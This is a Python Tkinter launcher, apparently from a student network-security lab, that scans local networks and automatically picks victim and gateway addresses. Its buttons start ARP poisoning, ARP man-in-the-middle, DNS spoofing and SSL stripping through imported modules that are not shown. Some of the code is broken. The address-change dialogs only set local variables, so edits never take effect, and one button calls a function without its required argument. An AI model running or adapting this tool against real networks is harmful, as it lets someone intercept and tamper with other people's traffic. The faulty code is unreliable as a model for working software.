import arp_poison
import dns_spoof
import arp_mitm_gateway
import ssl_strip
import recon
import os
import sys
import threading
import tkinter as tk

def main():
    os.system("clear")
    print("Hold on, Scanning Network...")
    interfaces = recon.list_interfaces()

    interfaceLAN = interfaces[1]
    interfaceNAT = interfaces[2]

    ipAttackerLAN = recon.get_own_ip_mac_adress(interfaceLAN)['ipAttacker']
    macAttackerLAN = recon.get_own_ip_mac_adress(interfaceLAN)['macAttacker']

    ipAttackerNAT = recon.get_own_ip_mac_adress(interfaceNAT)['ipAttacker']
    macAttackerNAT = recon.get_own_ip_mac_adress(interfaceNAT)['macAttacker']

    ipGateway = recon.get_gateway()['ipGateway']
    macGateway = recon.get_gateway()['macGateway']

    devicesListNAT = recon.scan_network(interfaceNAT)
    ipVictimNAT = devicesListNAT[3]['ip']
    macVictimNAT = devicesListNAT[3]['mac']

    devicesListLAN = recon.scan_network(interfaceLAN)
    ipVictimLAN = devicesListLAN[0]['ip']
    macVictimLAN = devicesListLAN[0]['mac']
    ipServerLAN = devicesListLAN[1]['ip']
    macServerLAN = devicesListLAN[1]['mac']

    # print("Please choose an attack:")
    # print("A. ARP Poisoning")
    # print("B. DNS Spoofing")
    # print("C. ARP Listener")
    # print("D. ARP MITM")
    # print("E. SSL Stripping")
    # attack = raw_input("Enter your choice: ")
    # print("\n\n\n")
    
    # if attack.lower() == "a":
    #     print("ARP Poisoning...")
    #     arp_poison.arp_poison(ipVictimLAN, macVictimLAN, ipServerLAN, macAttackerLAN, interfaceLAN)
    # elif attack.lower() == "b":
    #     print("DNS Spoofing...")
    #     dns_spoof.dns_spoof()
    # elif attack.lower() == "c":
    #     arp_poison.arp_listener(macAttackerLAN, interfaceLAN)
    # elif attack.lower() == "d":
    #     arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT)
    # elif attack.lower() == "e":
    #     print("MITM ...")
    #     arp_thread = threading.Thread(target=arp_mitm_gateway.spoof, args=(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT))
    #     arp_thread.start()

    #     print("SSL Stripping...")
    #     ssl_thread = threading.Thread(target=ssl_strip.ssl_strip, args=(interfaceNAT,))
    #     ssl_thread.start()

    #     arp_thread.join()
    #     ssl_thread.join()

    # else:
    #     print("Unknown command: {}. Use either 'A', 'B', 'C', 'D', or 'E'".format(attack))
    #     sys.exit(1)

    
    win = tk.Tk()
    win.geometry("800x600")
    win.title("Group 36 Tool")
    win.resizable(False, False)
    
    labelIPVLAN = tk.Label(win, text="Target IP LAN(M1): {}".format(ipVictimLAN))
    labelIPVLAN.pack()

    labelIPGateLAN = tk.Label(win, text="Gateway(Server) LAN IP (M2): {}".format(ipServerLAN))
    labelIPGateLAN.pack()

    labelIPAttLAN = tk.Label(win, text="Attacker IP (M3) LAN: {}".format(ipAttackerLAN))
    labelIPAttLAN.pack()

    labelIPVNAT = tk.Label(win, text="Target IP NAT(M1): {}".format(ipVictimNAT))
    labelIPVNAT.pack()

    labelIPGateNAT = tk.Label(win, text="Gateway NAT IP (M2): {}".format(ipGateway))
    labelIPGateNAT.pack()

    labelIPAttNAT = tk.Label(win, text="Attacker IP (M3) NAT: {}".format(ipAttackerNAT))
    labelIPAttNAT.pack()

    # def notCorrect():
    #     popup = tk.Toplevel(win)
    #     popup.geometry("300x300")
    #     popup.title("Change IPs")
    #     popup.resizable(False, False)            

    #     menuButton = tk.Menubutton(popup, text="Choose Machine", relief="raised")
    #     menu = tk.Menu(menuButton, tearoff=0)
    #     selectedIP = tk.StringVar()
        
    #     menu.add_checkbutton(label="IPVICTIMLAN", value=ipVictimLAN, variable=selectedIP)
    #     print(selectedIP)

    #     menuButton["menu"] = menu 
    #     menuButton.pack()

    menu = tk.Menu(win)
    win.config(menu=menu)

    def changeTargetLAN():
        popup = tk.Toplevel(win)
        popup.geometry("200x200")
        popup.title("Change Target IP LAN")
        popup.resizable(False, False)   

        ip = tk.StringVar()
        mac = tk.StringVar()

        def changeIP():
            ipVictimLAN = ip.get()
            macVictimLAN = mac.get()
            labelIPVLAN.configure(text="Target IP LAN(M1): {}".format(ip.get()))
            popup.destroy()
            
        entryIP = tk.Entry(popup, textvariable=ip)
        entryIP.pack()

        entryMAC = tk.Entry(popup, textvariable=mac)
        entryMAC.pack()


        tk.Label(win, text="MAC format = ff:ff:ff:ff:ff:ff").pack()
        button = tk.Button(popup, text="Change", command=changeIP)
        button.pack(pady=10)

    def changeGateLAN():
        popup = tk.Toplevel(win)
        popup.geometry("200x200")
        popup.title("Change Gateway IP LAN")
        popup.resizable(False, False)   

        ip = tk.StringVar()
        mac = tk.StringVar()

        def changeIP():
            ipServerLAN = ip.get()
            macServerLAN = mac.get()
            labelIPGateLAN.configure(text="Gateway(Server) LAN IP (M2): {}".format(ip.get()))
            popup.destroy()
            
        entryIP = tk.Entry(popup, textvariable=ip)
        entryIP.pack()

        entryMAC = tk.Entry(popup, textvariable=mac)
        entryMAC.pack()


        tk.Label(win, text="MAC format = ff:ff:ff:ff:ff:ff").pack()
        button = tk.Button(popup, text="Change", command=changeIP)
        button.pack(pady=10)

    def changeAttLAN():
        popup = tk.Toplevel(win)
        popup.geometry("200x200")
        popup.title("Change Gateway IP LAN")
        popup.resizable(False, False)   

        ip = tk.StringVar()
        mac = tk.StringVar()

        def changeIP():
            ipAttackerLAN = ip.get()
            macAttackerLAN = mac.get()
            labelIPAttLAN.configure(text="Attacker IP (M3) LAN: {}".format(ip.get()))
            popup.destroy()
            
        entryIP = tk.Entry(popup, textvariable=ip)
        entryIP.pack()

        entryMAC = tk.Entry(popup, textvariable=mac)
        entryMAC.pack()


        tk.Label(win, text="MAC format = ff:ff:ff:ff:ff:ff").pack()
        button = tk.Button(popup, text="Change", command=changeIP)
        button.pack(pady=10)
    
    def changeTargetNAT():
        popup = tk.Toplevel(win)
        popup.geometry("200x200")
        popup.title("Change Gateway IP LAN")
        popup.resizable(False, False)   

        ip = tk.StringVar()
        mac = tk.StringVar()

        def changeIP():
            ipVictimNAT = ip.get()
            macVictimNAT = mac.get()
            labelIPVNAT.configure(text="Target IP NAT(M1): {}".format(ip.get()))
            popup.destroy()
            
        entryIP = tk.Entry(popup, textvariable=ip)
        entryIP.pack()

        entryMAC = tk.Entry(popup, textvariable=mac)
        entryMAC.pack()


        tk.Label(win, text="MAC format = ff:ff:ff:ff:ff:ff").pack()
        button = tk.Button(popup, text="Change", command=changeIP)
        button.pack(pady=10)

    def changeGateNAT():
        popup = tk.Toplevel(win)
        popup.geometry("200x200")
        popup.title("Change Gateway IP LAN")
        popup.resizable(False, False)   

        ip = tk.StringVar()
        mac = tk.StringVar()

        def changeIP():
            ipGateway = ip.get()
            macGateway = mac.get()
            labelIPGateNAT.configure(text="Gateway NAT IP (M2): {}".format(ip.get()))
            popup.destroy()
            
        entryIP = tk.Entry(popup, textvariable=ip)
        entryIP.pack()

        entryMAC = tk.Entry(popup, textvariable=mac)
        entryMAC.pack()


        tk.Label(win, text="MAC format = ff:ff:ff:ff:ff:ff").pack()
        tk.Label(win, text="Not recommended to change this").pack()
        button = tk.Button(popup, text="Change", command=changeIP)
        button.pack(pady=10)

    def changeAttNAT():
        popup = tk.Toplevel(win)
        popup.geometry("200x200")
        popup.title("Change Gateway IP LAN")
        popup.resizable(False, False)   

        ip = tk.StringVar()
        mac = tk.StringVar()

        def changeIP():
            ipAttackerNAT = ip.get()
            macAttackerNAT = mac.get()
            labelIPAttNAT.configure(text="Attacker IP (M3) NAT: {}".format(ip.get()))
            popup.destroy()
            
        entryIP = tk.Entry(popup, textvariable=ip)
        entryIP.pack()

        entryMAC = tk.Entry(popup, textvariable=mac)
        entryMAC.pack()


        tk.Label(win, text="MAC format = ff:ff:ff:ff:ff:ff").pack()
        button = tk.Button(popup, text="Change", command=changeIP)
        button.pack(pady=10)


    def showList():
        popup = tk.Toplevel(win)
        popup.geometry("500x500")
        popup.title("Devices")
        popup.resizable(False, False) 


        tk.Label(popup, text="LAN Devices").pack()
        for entry in devicesListLAN: 
            tk.Label(popup, text=str(entry)).pack()

        tk.Label(popup, text="NAT Devices").pack()
        for entry in devicesListNAT: 
            tk.Label(popup, text=str(entry)).pack()

        



    changeMenu = tk.Menu(menu)
    changeMenu.add_command(label="Change Target Details (LAN)", command=changeTargetLAN)
    changeMenu.add_command(label="Change Gateway Details (LAN)", command=changeGateLAN)
    changeMenu.add_command(label="Change Attacker Details (LAN)", command=changeAttLAN)
    changeMenu.add_command(label="Change Target Details (NAT)", command=changeTargetNAT)
    changeMenu.add_command(label="Change Gateway Details (NAT)", command=changeGateNAT)
    changeMenu.add_command(label="Change Attacker Details (NAT)", command=changeAttNAT)
    changeMenu.add_command(label="View Device List", command=showList)
    menu.add_cascade(label="Change Details", menu=changeMenu)


        

    def dns():
        print("MITM Activated")
        gatewayspoof = threading.Thread(target=arp_mitm_gateway.spoof, args=(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT))
        print("DNS Spoofing")
        dnsthread = threading.Thread(target=dns_spoof.dns_spoof)
        gatewayspoof.start()
        dnsthread.start()
        gatewayspoof.join()
        dnsthread.join()

    def arpPoison():
        arp_poison.arp_poison(ipVictimLAN, macVictimLAN, ipServerLAN, macAttackerLAN, interfaceLAN)
    def arpListen():
        arp_poison.arp_listener(macAttackerLAN, interfaceLAN)
    def arpGateway(checked):
        arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT, checked)

    def ssl():
        print("MITM ...")
        arp_thread = threading.Thread(target=arp_mitm_gateway.spoof, args=(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT))
        arp_thread.start()

        print("SSL Stripping...")
        ssl_thread = threading.Thread(target=ssl_strip.ssl_strip, args=(interfaceNAT,))
        ssl_thread.start()

        arp_thread.join()
        ssl_thread.join()

    def exit():
        win.destroy()
        sys.exit()
        quit()

    

    arpButton = tk.Button(win, text="ARP Poison Target", command=arpPoison)
    arpButton.pack(pady=10)
    arpListener = tk.Button(win, text="ARP Listener (MITM LAN)", command=arpListen)
    arpListener.pack(pady=10)
    arpMITM = tk.Button(win, text="ARP Spoof (MITM NAT)", command=arpGateway)
    arpMITM.pack(pady=10)
    dnsButton = tk.Button(win, text="DNS Spoof", command=dns)
    dnsButton.pack(pady=10)
    sslButton = tk.Button(win, text="SSL Strip", command=ssl)
    sslButton.pack(pady=10)
    win.protocol("WM_DELETE_WINDOW", exit)
    


    win.mainloop()

if __name__ == "__main__":
    main()




'''
print("#######################################")
# print(recon.scan_network(interfaceNAT))
print("Target IP LAN(M1): {}".format(ipVictimLAN))
print("Target MAC LAN(M1): {}\n".format(macVictimLAN))
print("Gateway(Server) LAN IP (M2): {}".format(ipServerLAN))
print("Gateway(Server) LAN MAC (M2): {}\n".format(macServerLAN))
print("Attacker IP (M3) LAN: {}".format(ipAttackerLAN))    
print("Attacker MAC (M3) LAN: {}\n".format(macAttackerLAN))
print("Target IP NAT(M1): {}".format(ipVictimNAT))
print("Target MAC NAT(M1): {}\n".format(macVictimNAT))
print("Gateway(Server) NAT IP (M2): {}".format(ipGateway))
print("Gateway(Server) NAT MAC (M2): {}\n".format(macGateway))
print("Attacker IP (M3) NAT: {}".format(ipAttackerNAT))    
print("Attacker MAC (M3) NAT: {}\n".format(macAttackerNAT))
print("#######################################\n\n\n")
'''